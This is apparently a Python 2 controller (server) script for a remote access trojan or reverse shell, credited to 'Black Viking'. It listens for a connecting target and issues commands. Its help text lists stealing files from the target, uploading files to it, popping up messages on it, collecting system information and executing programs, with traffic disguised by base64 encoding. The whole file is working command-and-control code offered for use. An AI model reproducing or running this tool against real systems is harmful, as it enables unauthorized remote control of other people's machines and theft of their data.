#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
#

"""
[~] Author : Black Viking
[~] Version: 0.2
"""

END_OF_FILE = "(((END_OF_FILE)))"

import socket
import os
import sys
import base64

reload(sys)
sys.setdefaultencoding("utf-8")

host = "127.0.0.1"
port = 8000

def crypt(TEXT, encode=True):
    if encode == True:
        return base64.b64encode(TEXT)
    else:
        return base64.b64decode(TEXT)

def send(data):
    global pwd
    cli.sendall(crypt(data))
    pwd = crypt(cli.recv(1024), False)
    print(crypt(cli.recv(16384), False))

def upload(command):
    fileName = command.replace("upload ", "")
    try:
        f = open(fileName, 'rb')
        cli.sendall(crypt(command))
        l = f.read(1024)

        while l:
            cli.send(l)
            l = f.read(1024)
        f.close()
        cli.send(END_OF_FILE)
        print crypt(cli.recv(1024), False)
        menu()

    except IOError:
        print "File not found"


def download(command):
    cli.sendall(crypt(command))
    fileName = command.replace("download ", "")
    while True:
        l = cli.recv(1024)

        if l.startswith("File not found"):
            print l 
            menu()
        else:
	        f = open(fileName, 'wb')
	        while (l):
	            if l.endswith(END_OF_FILE):
	                if END_OF_FILE in l:
	                    l = l.replace(END_OF_FILE, "")
	                f.write(l)
	                break
	            else:
	                f.write(l)
	                l = cli.recv(1024)

	        print "[+] Download complete!"
	        print "[+] %s ==> %s\n"%(fileName, os.getcwd()+os.sep+fileName)
	        f.close()
	        break
	        menu()

def help():
    print"""
Commands:
    download                : Download files from client.
    upload                  : Upload files to client from server.
    message TEXT            : Show messages on target system.
    info()                  : Show target system's info.
    execute PROGRAM ARGS    : Execute programs in a new process.
    
Execute programs on local machine:
    :dir ==> with ":"
    :cls
    :clear"""
    menu()

def main():
    global s, cli, addr, hostname, pwd
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    cli, addr = s.accept()

    pwd = crypt(cli.recv(1024), False)
    hostname = crypt(cli.recv(1024), False)

def menu():
    while True:
        command = raw_input("[%s@%s]-[%s]~$ "%(hostname, addr[0], pwd))
        if command == "help()":
            help()
            menu()

        elif ":" in command:
            command = command.replace(":", "")
            if command[:2].decode("utf-8") == 'cd':
                try:
                    os.chdir(command[3:].decode("utf-8"))
                    menu()
                except OSError:
                    print "%s: No such file or directory"%(command[3:])
                    menu()
                    
            else:
                os.system(command)
                menu()

        elif "upload" in command:
            upload(command)

        elif "download" in command:
            download(command)

        elif command == "": 
            command = " "

        else:
            send(command)
def start():
    while True:
        try:
            main()
            menu()
        except Exception as e:
            print e

if __name__ == "__main__":
    start()
